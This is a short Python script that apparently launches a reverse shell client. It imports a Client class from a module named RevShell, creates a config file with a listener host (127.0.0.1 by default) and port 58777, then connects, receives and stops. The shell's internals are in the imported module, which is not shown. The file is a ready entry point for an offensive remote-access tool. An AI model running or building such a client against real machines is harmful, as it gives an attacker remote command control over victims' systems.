from RevShell import Client
import json, os.path

if __name__ == '__main__':
    if not os.path.isfile('config.json'):
        config = open('config.json', 'w')
        config.write(json.dumps({'host': '127.0.0.1', 'port': 58777}, sort_keys = True))

    server = json.loads(open('config.json', 'r').read())
    client = Client(server['host'], server['port'])
    client.connect()
    client.receive()
    client.stop()